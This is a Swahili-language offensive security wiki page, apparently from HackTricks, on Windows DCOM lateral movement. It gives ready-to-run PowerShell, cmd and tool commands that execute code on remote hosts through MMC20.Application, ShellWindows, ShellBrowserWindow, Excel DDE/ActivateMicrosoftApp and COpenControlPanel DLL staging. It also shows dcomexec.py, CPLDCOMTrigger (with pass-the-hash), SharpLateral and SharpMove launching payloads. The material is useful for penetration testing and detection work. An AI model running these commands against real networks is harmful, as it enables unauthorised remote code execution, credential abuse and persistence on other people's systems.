# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement inavutia kwa sababu hutumia tena seva za COM zilizopo zinazopatikana kupitia RPC/DCOM badala ya kuunda service au scheduled task. Kwa vitendo, hii inamaanisha kuwa muunganisho wa awali kwa kawaida huanza kwenye TCP/135, kisha huhamia kwenye porti za juu za RPC zilizokabidhiwa kwa nguvu.

## Masharti ya Awali na Mambo ya Kuzingatia

- Kwa kawaida unahitaji muktadha wa local administrator kwenye target, na seva ya COM ya mbali lazima iruhusu uzinduzi/uwezeshaji wa mbali.
- Tangu **Machi 14, 2023**, Microsoft inatekeleza uimarishaji wa DCOM kwenye mifumo inayotumika. Clients za zamani zinazoomba kiwango cha chini cha uthibitishaji wa activation zinaweza kushindwa isipokuwa zijadiliane kufikia angalau `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Windows clients za kisasa kwa kawaida hupandishwa kiwango kiotomatiki, kwa hiyo tooling ya sasa kwa kawaida huendelea kufanya kazi.<sup>[[3]](#references)</sup>
- Utekelezaji wa DCOM wa mkono au wa script kwa ujumla unahitaji TCP/135 pamoja na masafa ya porti za RPC zinazobadilika za target. Ikiwa unatumia Impacket's `dcomexec.py` na unataka matokeo ya command yarudishwe, kwa kawaida unahitaji pia ufikiaji wa SMB kwenye `ADMIN$` (au share nyingine inayoweza kusomeka/kuandikika).
- Ikiwa RPC/DCOM inafanya kazi lakini SMB imezuiwa, `dcomexec.py -nooutput` bado inaweza kusaidia kwa utekelezaji usio na matokeo yanayoonekana.

Ukaguzi wa haraka:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

Kwa maelezo zaidi kuhusu mbinu hii, angalia [chapisho asilia la MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Objekti za Distributed Component Object Model (DCOM) zina uwezo wa kuvutia wa kufanya mwingiliano na objekti kupitia mtandao. Microsoft hutoa nyaraka za kina kuhusu DCOM na Component Object Model (COM), zinazopatikana [hapa kwa DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) na [hapa kwa COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Orodha ya programu za DCOM inaweza kupatikana kwa kutumia amri ya PowerShell:

```bash
Get-CimInstance Win32_DCOMApplication
```

Kitu cha COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), huwezesha uandishi wa script za shughuli za MMC snap-in. Hasa, kitu hiki kina method ya `ExecuteShellCommand` chini ya `Document.ActiveView`. Maelezo zaidi kuhusu method hii yanapatikana [hapa](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Ijaribu ikiendelea:<sup>[[6]](#references)</sup>

Kipengele hiki hurahisisha utekelezaji wa amri kupitia mtandao kwa kutumia programu ya DCOM. Ili kuingiliana na DCOM kwa mbali kama admin, PowerShell inaweza kutumiwa hivi:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

Amri hii huunganisha kwenye programu ya DCOM na kurudisha instance ya object ya COM. Kisha method ya ExecuteShellCommand inaweza kuitwa ili kutekeleza process kwenye host ya mbali. Mchakato huu unahusisha hatua zifuatazo:

Kagua methods:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Pata RCE:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

Hoja ya mwisho ni mtindo wa dirisha. `7` huweka dirisha limepunguzwa. Kwa kawaida, utekelezaji unaotegemea MMC husababisha mchakato wa `mmc.exe` wa mbali kuanzisha payload yako, tofauti na objects zinazotegemea Explorer zilizo hapa chini.

## ShellWindows & ShellBrowserWindow

**Kwa maelezo zaidi kuhusu mbinu hii, angalia chapisho asili [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Object ya **MMC20.Application** ilionekana bila thamani ya `LaunchPermission` mahususi kwa application.<sup>[[2]](#references)</sup> Hili pekee halitoi ruhusa ya kufikia: COM hukagua ACL ya mashine ya `DefaultLaunchPermission` pamoja na vizuizi vya machine-wide vya launch/access vinapotumika.<sup>[[9]](#references)[[10]](#references)</sup> Kwa maelezo zaidi, unaweza kuchunguza thread [hapa](https://twitter.com/tiraniddo/status/817532039771525120), na inapendekezwa kutumia OleView .NET ya [@tiraniddo](https://twitter.com/tiraniddo) kuchuja objects zisizo na Launch Permission iliyo wazi.

Objects mbili mahususi, `ShellBrowserWindow` na `ShellWindows`, ziliangaziwa kwa kuwa hazina Launch Permissions zilizo wazi.<sup>[[2]](#references)</sup> Kutokuwepo kwa thamani ya `LaunchPermission` chini ya `HKCR:\AppID\{guid}` kunamaanisha hakuna ACL ya launch mahususi kwa application; **hakumaanishi** kuwa remote activation haina vikwazo.<sup>[[9]](#references)[[10]](#references)</sup>

Ikilinganishwa na `MMC20.Application`, mara nyingi objects hizi hazionekani sana kwa mtazamo wa OPSEC, kwa sababu amri huwa child process ya `explorer.exe` kwenye host ya mbali badala ya `mmc.exe`.

### ShellWindows

Kwa `ShellWindows`, ambayo haina ProgID, mbinu za .NET `Type.GetTypeFromCLSID` na `Activator.CreateInstance` hurahisisha kuunda object kwa kutumia CLSID yake. Mchakato huu hutumia OleView .NET kupata CLSID ya `ShellWindows`. Baada ya kuundwa, unaweza kuingiliana nayo kupitia mbinu ya `WindowsShell.Item`, na hivyo kuita mbinu kama `Document.Application.ShellExecute`.<sup>[[2]](#references)</sup>

Mifano ya amri za PowerShell ilitolewa ili kuunda object na kutekeleza amri kwa mbali:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` inafanana, lakini unaweza kuiunda moja kwa moja kupitia CLSID yake na kutumia `Document.Application.ShellExecute` kufanya pivot:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Lateral Movement with Excel DCOM Objects

Lateral movement inaweza kufanikishwa kwa kutumia vibaya Excel DCOM objects. Kwa maelezo zaidi, inashauriwa kusoma mjadala kuhusu kutumia Excel DDE kwa lateral movement kupitia DCOM kwenye [blogu ya Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Mradi wa Empire unatoa script ya PowerShell inayoonyesha jinsi ya kutumia Excel kwa remote code execution (RCE) kwa kuchezea DCOM objects. Hapa chini kuna vipande kutoka kwenye script inayopatikana kwenye [hazina ya GitHub ya Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), vinavyoonyesha mbinu mbalimbali za kutumia vibaya Excel kwa RCE:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

Utafiti wa hivi karibuni umepanua eneo hili kwa kutumia methodi ya `Excel.Application` ya `ActivateMicrosoftApp()`. Wazo kuu ni kwamba Excel inaweza kujaribu kuzindua programu za zamani za Microsoft kama FoxPro, Schedule Plus, au Project kwa kuzitafuta kwenye `PATH` ya mfumo. Ikiwa operator anaweza kuweka payload yenye mojawapo ya majina yanayotarajiwa kwenye eneo linaloweza kuandikika ambalo liko kwenye `PATH` ya target, Excel itaitekeleza.<sup>[[4]](#references)</sup>

Mahitaji ya mbinu hii:

- Local admin kwenye target
- Excel imesakinishwa kwenye target
- Uwezo wa kuandika payload kwenye saraka inayoweza kuandikika ndani ya `PATH` ya target

Mfano wa vitendo unaotumia vibaya utafutaji wa FoxPro (`FOXPROW.exe`):

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

Ikiwa host ya mshambulizi haina ProgID ya ndani `Excel.Application` iliyosajiliwa, tengeneza object ya mbali kwa kutumia CLSID badala yake:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

Values zilizoonekana kutumiwa vibaya kwa vitendo:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — kupakia Control Panel DLL iliyosajiliwa

Darasa la `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) hutoa `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Mbinu yake ya `Open()` husababisha Control Panel DLL zilizosajiliwa chini ya ufunguo wa `Control Panel\Cpls` kupakiwa na `dllhost.exe` ya mbali. Darasa hili halina ruhusa zilizoainishwa wazi za uzinduzi/ufikiaji kwenye mifumo iliyojaribiwa, kwa hiyo hurithi sera chaguomsingi ya DCOM (ambayo kwa kawaida huhitaji msimamizi kwa uanzishaji wa mbali). Jina lolote la kipengee linatosha kufanya `Open()` ichakate DLL zilizosajiliwa; payload haihitaji kiendelezi cha `.cpl`, ingawa lazima iwe DLL halali yenye usanifu sahihi.<sup>[[7]](#references)</sup>

Primitive hii ni **stage-and-trigger**, si command-only execution: kwanza nakili DLL kwenye target na uunde thamani ya `REG_EXPAND_SZ` inayoielekeza, kisha uanzishe object kupitia DCOM. Kwa mfano, kutoka kwenye muktadha wa Windows wenye ruhusa za usimamizi:<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

Client ya umma ya [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) hutekeleza wito wa DCOM ambao haujaandikwa kwa kutumia Impacket. Kutoa jina lolote la kipengee cha Control Panel kunatosha; client inaweza kuripoti hitilafu ya RPC hata kama `dllhost.exe` imepakia DLL.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

Kwa upande wa uendeshaji, njia hii pia inahitaji njia ya kuandika faili na ufikiaji wa registry ya mbali, kwa hiyo huacha shughuli nyingi zaidi kuliko `MMC20`/`ShellWindows`. Husababisha athari ya persistence kwa sababu kufungua Control Panel baadaye kunaweza kupakia ingizo hilo tena. Ondoa thamani baada ya utekelezaji na tafuta thamani zisizotarajiwa za `Control Panel\Cpls` pamoja na upakiaji usio wa kawaida wa DLL katika `dllhost.exe`.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Zana za Kuendesha Kiotomatiki kwa Lateral Movement

Zana mbili zimeangaziwa kwa ajili ya kuendesha mbinu hizi kiotomatiki:

- **Invoke-DCOM.ps1**: Script ya PowerShell iliyotolewa na mradi wa Empire ambayo hurahisisha kutumia mbinu mbalimbali za kutekeleza code kwenye mashine za mbali. Script hii inapatikana kwenye hazina ya GitHub ya Empire.

- **SharpLateral**: Zana iliyoundwa kwa ajili ya kutekeleza code kwa mbali, ambayo inaweza kutumika kwa amri hii:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## Zana za Kiotomatiki

- Script ya Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) hukuwezesha kutumia kwa urahisi njia zote zilizotolewa maoni za kutekeleza code kwenye mashine nyingine.
- Unaweza kutumia `dcomexec.py` ya Impacket kutekeleza amri kwenye mifumo ya mbali kwa kutumia DCOM. Builds za sasa zinatumia `ShellWindows`, `ShellBrowserWindow`, na `MMC20`, na chaguo-msingi ni `ShellWindows`.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- Unaweza pia kutumia [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- Unaweza pia kutumia [**SharpMove**](https://github.com/0xthirteen/SharpMove)

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [Lateral Movement kwa kutumia MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement kupitia DCOM: Raundi ya 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Dhibiti mabadiliko ya Windows DCOM Server Security Feature Bypass (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: Tumia nguvu ya DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Kutumia Excel DDE kwa Lateral Movement kupitia DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - Darasa la MMC Application (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Kutumia DCOM objects kwa utekelezaji wa amri za mbali](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM: Kiambatisho B, Tabia ya Bidhaa - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
